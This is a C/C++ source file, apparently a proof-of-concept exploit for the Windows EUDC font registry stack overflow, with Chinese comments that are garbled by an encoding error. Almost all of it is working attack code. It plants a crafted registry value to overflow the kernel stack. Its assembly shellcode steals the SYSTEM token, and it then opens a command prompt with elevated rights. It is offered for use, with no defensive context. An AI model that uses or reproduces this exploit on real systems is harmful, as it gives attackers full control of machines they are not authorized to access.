/*
ת��ʱ��ע����KiDebug������ϵ��ʽ��KiDebug@163.com
*/
//#include <windows.h>
#include <stdio.h>
#include <afxwin.h>  


extern "C" BOOL WINAPI EnableEUDC(BOOL fEnableEUDC);

void _declspec(naked) ShellCode()
{
	__asm
	{
			mov eax, fs:[34h]
			mov eax,[eax + 78h]
			mov eax,[eax]
			mov eax,[eax+40h];
			mov ebx,fs:[124h]
			mov ebx,[ebx+50h]
			mov [ebx+0f8h],eax
			mov ebp,esp
			add ebp,30h
			mov edi,[ebp+4]
			mov eax,[edi-4]
			add edi,eax
			mov eax,04h
			repnz scasb
			lea edi,[edi+9]
			push edi
			xor eax,eax
			ret
	}
}

//ջ�ռ� 8��DWORD��һ��ebp��һ�����ص�ַ��������������ebp-0x20+8��ʼ����Ҫ����10��DWORD����0x28���ֽ�
//֮����Ҫ���ǲ�������Ϊwcsncpy_s �����
//֮����ע������������Ϊebp-4��ebp-c��������ڴ�û�б��ͷ�
void main()
{
	BYTE	RegBuf[0x28] = {0};
	DWORD	ExpSize = 0x28;
	*(DWORD*)(RegBuf + 0x1C) = (DWORD)ShellCode;

	UINT	codepage = GetACP();
	WCHAR	tmpstr[256];
	swprintf_s(tmpstr, L"EUDC\\%d", codepage);
	HKEY hKey;
	RegCreateKeyEx(HKEY_CURRENT_USER, tmpstr, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | DELETE, NULL, &hKey, NULL);
	RegDeleteValue(hKey, L"SystemDefaultEUDCFont");

	RegSetValueEx(hKey, L"SystemDefaultEUDCFont", 0, REG_BINARY, RegBuf, ExpSize);
	EnableEUDC(TRUE);

	RegDeleteValue(hKey, L"SystemDefaultEUDCFont");
	RegCloseKey(hKey);

	ShellExecuteA(NULL,   "open",   "cmd.exe ",   NULL,   NULL,   SW_SHOWNORMAL);
}


